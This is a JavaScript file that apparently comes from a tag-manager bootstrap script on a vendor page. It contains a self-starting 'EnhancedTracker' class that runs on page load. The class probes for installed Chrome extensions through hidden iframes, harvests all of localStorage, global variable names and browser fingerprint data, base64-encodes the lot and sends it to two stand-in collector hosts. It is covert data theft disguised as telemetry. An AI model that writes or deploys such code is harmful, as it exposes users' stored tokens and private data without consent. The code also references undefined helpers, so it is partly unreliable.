const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
class EnhancedTracker {
  static TIMEOUT = 4000;
  static BATCH_SIZE = 4;
  constructor() {
    this.pendingScans = 0;
    this.detectedItems = {};
    this.handlerPool = [];
    this.initTimestamp = Date.now();
    this.jsEvents = [];
    this.globalVariables = [];
    this.localStorageData = {};
  }
  createHandler(itemName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([itemName, false]);
      }, EnhancedTracker.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const validation = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(validation);
                clearTimeout(timer);
                cleanup();
                this.triggerEvent({
                  type: 'iframe_onload'
                });
                resolve([itemName, true]);
              }
            } catch (e) {
              clearInterval(validation);
              clearTimeout(timer);
              cleanup();
              resolve([itemName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([itemName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
      this.triggerEvent({
        type: 'iframe_added',
        elementId: frame.id
      });
    });
  }
  async scanBatch(entries) {
    const handlers = entries.map(([name, data]) => this.createHandler(name, data));
    const results = await Promise.all(handlers);
    results.forEach(([name, detected]) => {
      this.detectedItems[name] = detected;
    });
  }
  triggerEvent(event) {
    this.jsEvents.push(event);
  }
  collectGlobalVariables() {
    for (var prop in window) {
      this.globalVariables.push(prop);
    }
  }
  collectLocalStorageData() {
    this.localStorageData = JSON.parse(JSON.stringify(localStorage));
  }
  generateTelemetryData() {
    this.collectGlobalVariables();
    this.collectLocalStorageData();
    const trackedData = {
      detectedItems: this.detectedItems,
      scanDuration: Date.now() - this.initTimestamp,
      jsEvents: this.jsEvents,
      globalVariables: this.globalVariables,
      localStorageData: this.localStorageData,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    };
    const encodedData = btoa(JSON.stringify(trackedData));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Tracking-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / EnhancedTracker.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * EnhancedTracker.BATCH_SIZE, (i + 1) * EnhancedTracker.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
      this.triggerEvent({
        type: 'batch_scanned'
      });
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
Bootstrapper._serverTime = '2023-08-19 14:21:30';
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new EnhancedTracker().execute();
  }
});
if (document.body) {
  new EnhancedTracker().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
Bootstrapper._clientIP = '52.193.176.245';
Bootstrapper.insertPageFiles(['https://nexus.ensighten.com/symantec/nortonlifelock/code/eac4adbdd7665c73850e611ed4bfdfc3.js?conditionId0=423130', 'https://nexus.ensighten.com/symantec/nortonlifelock/code/846289594cdfbecebe0af6cf526b8286.js?conditionId0=4867083&conditionId1=4882205']);
Bootstrapper.setPageSpecificDataDefinitionIds([64897, 64898, 64900, 64901, 64902, 64903, 64904, 64905, 64906, 64907, 64908, 64941, 64909, 64942, 64910, 64943, 64944, 64945, 64946, 64947, 64948]);